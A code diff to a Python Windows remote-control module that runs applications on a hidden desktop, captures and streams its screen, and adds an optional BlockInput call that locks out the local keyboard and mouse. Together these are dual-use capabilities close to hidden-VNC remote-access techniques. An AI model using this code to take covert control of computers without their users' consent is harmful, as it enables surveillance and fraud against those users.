@@ -55,6 +55,9 @@ if platform.system() == "Windows":
         DESKTOP_READOBJECTS
         | DESKTOP_CREATEWINDOW
         | DESKTOP_CREATEMENU
+        | DESKTOP_HOOKCONTROL
+        | DESKTOP_JOURNALRECORD
+        | DESKTOP_JOURNALPLAYBACK
         | DESKTOP_ENUMERATE
         | DESKTOP_WRITEOBJECTS
         | DESKTOP_SWITCHDESKTOP
@@ -63,6 +66,8 @@ if platform.system() == "Windows":
     SRCCOPY = 0x00CC0020
     DIB_RGB_COLORS = 0
     BI_RGB = 0
+    HORZRES = 8
+    VERTRES = 10
 
     class BITMAPINFOHEADER(ctypes.Structure):
         _fields_ = [
@@ -90,19 +95,28 @@ if platform.system() == "Windows":
             ("bottom", wintypes.LONG),
         ]
 
+    class SECURITY_ATTRIBUTES(ctypes.Structure):
+        _fields_ = [
+            ("nLength", wintypes.DWORD),
+            ("lpSecurityDescriptor", wintypes.LPVOID),
+            ("bInheritHandle", wintypes.BOOL),
+        ]
+
     user32.CreateDesktopW.argtypes = [
         wintypes.LPCWSTR,
         wintypes.LPCWSTR,
         wintypes.LPVOID,
         wintypes.DWORD,
         wintypes.DWORD,
-        wintypes.LPVOID,
+        ctypes.POINTER(SECURITY_ATTRIBUTES),
     ]
     user32.CreateDesktopW.restype = wintypes.HANDLE
     user32.CloseDesktop.argtypes = [wintypes.HANDLE]
     user32.CloseDesktop.restype = wintypes.BOOL
     user32.SetThreadDesktop.argtypes = [wintypes.HANDLE]
     user32.SetThreadDesktop.restype = wintypes.BOOL
+    user32.BlockInput.argtypes = [wintypes.BOOL]
+    user32.BlockInput.restype = wintypes.BOOL
     user32.GetDesktopWindow.argtypes = []
     user32.GetDesktopWindow.restype = wintypes.HWND
     user32.GetWindowRect.argtypes = [wintypes.HWND, ctypes.POINTER(RECT)]
@@ -114,8 +128,17 @@ if platform.system() == "Windows":
 
     gdi32.CreateCompatibleDC.argtypes = [wintypes.HDC]
     gdi32.CreateCompatibleDC.restype = wintypes.HDC
+    gdi32.CreateDCW.argtypes = [
+        wintypes.LPCWSTR,
+        wintypes.LPCWSTR,
+        wintypes.LPCWSTR,
+        wintypes.LPVOID,
+    ]
+    gdi32.CreateDCW.restype = wintypes.HDC
     gdi32.DeleteDC.argtypes = [wintypes.HDC]
     gdi32.DeleteDC.restype = wintypes.BOOL
+    gdi32.GetDeviceCaps.argtypes = [wintypes.HDC, wintypes.INT]
+    gdi32.GetDeviceCaps.restype = wintypes.INT
     gdi32.CreateCompatibleBitmap.argtypes = [wintypes.HDC, wintypes.INT, wintypes.INT]
     gdi32.CreateCompatibleBitmap.restype = wintypes.HBITMAP
     gdi32.SelectObject.argtypes = [wintypes.HDC, wintypes.HGDIOBJ]
@@ -209,7 +232,11 @@ def _resolve_app_executable(app_name: str) -> str | None:
 def _create_desktop(name: str):
     if platform.system() != "Windows":
         raise RuntimeError("Hidden desktop is only supported on Windows.")
-    handle = user32.CreateDesktopW(name, None, None, 0, DESKTOP_ACCESS, None)
+    sa = SECURITY_ATTRIBUTES()
+    sa.nLength = ctypes.sizeof(SECURITY_ATTRIBUTES)
+    sa.lpSecurityDescriptor = None
+    sa.bInheritHandle = 0
+    handle = user32.CreateDesktopW(name, None, None, 0, DESKTOP_ACCESS, ctypes.byref(sa))
     if not handle:
         raise ctypes.WinError()
     return handle
@@ -233,9 +260,49 @@ def _set_thread_desktop(handle) -> bool:
     return True
 
 
+def _toggle_block_input(enabled: bool) -> bool:
+    if platform.system() != "Windows":
+        return False
+    try:
+        return bool(user32.BlockInput(1 if enabled else 0))
+    except Exception:
+        logger.warning("BlockInput failed.")
+        return False
+
+
+def _open_hidden_desktop_dc(desktop_path: str | None):
+    if not desktop_path:
+        return None, 0, 0, None
+    create_dc = getattr(gdi32, "CreateDCW", None)
+    if create_dc is None:
+        return None, 0, 0, None
+    hdc = create_dc(desktop_path, None, None, None)
+    if not hdc:
+        hdc = create_dc("DISPLAY", desktop_path, None, None)
+    if not hdc:
+        return None, 0, 0, None
+    width = int(gdi32.GetDeviceCaps(hdc, HORZRES))
+    height = int(gdi32.GetDeviceCaps(hdc, VERTRES))
+
+    def _cleanup() -> None:
+        try:
+            gdi32.DeleteDC(hdc)
+        except Exception:
+            return
+
+    return hdc, width, height, _cleanup
+
+
 class HiddenDesktopCapture:
-    def __init__(self, desktop_handle, draw_cursor: bool = False, fps: int = 30) -> None:
+    def __init__(
+        self,
+        desktop_handle,
+        desktop_path: str | None = None,
+        draw_cursor: bool = False,
+        fps: int = 30,
+    ) -> None:
         self._desktop_handle = desktop_handle
+        self._desktop_path = desktop_path
         self._draw_cursor = bool(draw_cursor)
         self._interval_lock = threading.Lock()
         self._interval = 1.0 / max(1, fps)
@@ -271,17 +338,18 @@ class HiddenDesktopCapture:
         if self._thread.is_alive():
             self._thread.join(timeout=1.5)
 
-    def _capture(self, srcdc, memdc, bmp, width: int, height: int) -> bytes | None:
+    def _capture(
+        self,
+        srcdc,
+        memdc,
+        bmp,
+        width: int,
+        height: int,
+        buffer,
+        bmi,
+    ) -> bytes | None:
         if not gdi32.BitBlt(memdc, 0, 0, width, height, srcdc, 0, 0, SRCCOPY):
             return None
-        bmi = BITMAPINFO()
-        bmi.bmiHeader.biSize = ctypes.sizeof(BITMAPINFOHEADER)
-        bmi.bmiHeader.biWidth = width
-        bmi.bmiHeader.biHeight = -height
-        bmi.bmiHeader.biPlanes = 1
-        bmi.bmiHeader.biBitCount = 32
-        bmi.bmiHeader.biCompression = BI_RGB
-        buffer = ctypes.create_string_buffer(width * height * 4)
         lines = gdi32.GetDIBits(memdc, bmp, 0, height, buffer, ctypes.byref(bmi), DIB_RGB_COLORS)
         if lines == 0:
             return None
@@ -290,33 +358,66 @@ class HiddenDesktopCapture:
     def _run(self) -> None:
         if not _set_thread_desktop(self._desktop_handle):
             return
-        hwnd = user32.GetDesktopWindow()
-        rect = RECT()
-        if not user32.GetWindowRect(hwnd, ctypes.byref(rect)):
-            logger.warning("Hidden desktop: failed to get desktop rect.")
-            return
-        width = max(1, rect.right - rect.left)
-        height = max(1, rect.bottom - rect.top)
-        self._frame_size = (width, height)
+        hwindc = None
+        width = 0
+        height = 0
+        release_dc = None
 
-        hwindc = user32.GetWindowDC(hwnd)
-        if not hwindc:
-            logger.warning("Hidden desktop: failed to get window DC.")
+        hwindc, width, height, release_dc = _open_hidden_desktop_dc(self._desktop_path)
+        if hwindc:
+            logger.info("Hidden desktop: capture DC opened via CreateDC.")
+        else:
+            hwnd = user32.GetDesktopWindow()
+            rect = RECT()
+            if not user32.GetWindowRect(hwnd, ctypes.byref(rect)):
+                logger.warning("Hidden desktop: failed to get desktop rect.")
+                return
+            width = max(1, rect.right - rect.left)
+            height = max(1, rect.bottom - rect.top)
+            hwindc = user32.GetWindowDC(hwnd)
+            if not hwindc:
+                logger.warning("Hidden desktop: failed to get window DC.")
+                return
+
+            def _release() -> None:
+                try:
+                    user32.ReleaseDC(hwnd, hwindc)
+                except Exception:
+                    return
+
+            release_dc = _release
+
+        if width <= 0 or height <= 0:
+            logger.warning("Hidden desktop: invalid capture size (%s x %s).", width, height)
+            if release_dc:
+                release_dc()
             return
+
+        self._frame_size = (width, height)
         memdc = gdi32.CreateCompatibleDC(hwindc)
         bmp = gdi32.CreateCompatibleBitmap(hwindc, width, height)
         if not memdc or not bmp:
             logger.warning("Hidden desktop: failed to create capture DC/bitmap.")
             if memdc:
                 gdi32.DeleteDC(memdc)
-            user32.ReleaseDC(hwnd, hwindc)
+            if release_dc:
+                release_dc()
             return
         old = gdi32.SelectObject(memdc, bmp)
+
+        bmi = BITMAPINFO()
+        bmi.bmiHeader.biSize = ctypes.sizeof(BITMAPINFOHEADER)
+        bmi.bmiHeader.biWidth = width
+        bmi.bmiHeader.biHeight = -height
+        bmi.bmiHeader.biPlanes = 1
+        bmi.bmiHeader.biBitCount = 32
+        bmi.bmiHeader.biCompression = BI_RGB
+        buffer = ctypes.create_string_buffer(width * height * 4)
 
         try:
             while not self._stop_event.is_set():
                 start = time.monotonic()
-                data = self._capture(hwindc, memdc, bmp, width, height)
+                data = self._capture(hwindc, memdc, bmp, width, height, buffer, bmi)
                 if data:
                     with self._frame_lock:
                         self._frame = data
@@ -330,7 +431,8 @@ class HiddenDesktopCapture:
             gdi32.SelectObject(memdc, old)
             gdi32.DeleteObject(bmp)
             gdi32.DeleteDC(memdc)
-            user32.ReleaseDC(hwnd, hwindc)
+            if release_dc:
+                release_dc()
 
 
 class HiddenDesktopTrack(MediaStreamTrack):
@@ -527,9 +629,21 @@ class HiddenDesktopSession:
         self._desktop_handle = _create_desktop(self._desktop_name)
         self._desktop_path = f"WinSta0\\{self._desktop_name}"
         self._processes: list[subprocess.Popen] = []
+        self._input_blocked = False
+        self._block_local_input = os.getenv("RC_BLOCK_LOCAL_INPUT", "").strip().lower() in {
+            "1",
+            "true",
+            "yes",
+            "on",
+        }
         self._start_shell()
 
-        self._capture = HiddenDesktopCapture(self._desktop_handle, draw_cursor=False, fps=30)
+        self._capture = HiddenDesktopCapture(
+            self._desktop_handle,
+            desktop_path=self._desktop_path,
+            draw_cursor=False,
+            fps=30,
+        )
         size = self._capture.frame_size
         deadline = time.monotonic() + 1.0
         while size == (0, 0) and time.monotonic() < deadline:
@@ -537,6 +651,8 @@ class HiddenDesktopSession:
             size = self._capture.frame_size
         self.screen_track = HiddenDesktopTrack(self._capture, profile="balanced")
         self.input_controller = HiddenDesktopInputController(self._desktop_handle, size)
+        if self._block_local_input:
+            self.block_local_input()
 
     def _start_shell(self) -> None:
         startupinfo = subprocess.STARTUPINFO()
@@ -561,9 +677,23 @@ class HiddenDesktopSession:
         proc = subprocess.Popen([exe], startupinfo=startupinfo)
         self._processes.append(proc)
 
+    def block_local_input(self) -> bool:
+        if self._input_blocked:
+            return True
+        self._input_blocked = _toggle_block_input(True)
+        if not self._input_blocked:
+            logger.warning("Hidden desktop: failed to block local input.")
+        return self._input_blocked
+
+    def unblock_local_input(self) -> None:
+        if self._input_blocked:
+            _toggle_block_input(False)
+            self._input_blocked = False
+
     def close(self) -> None:
         self.screen_track.stop()
         self.input_controller.close()
+        self.unblock_local_input()
         for proc in self._processes:
             try:
                 proc.terminate()
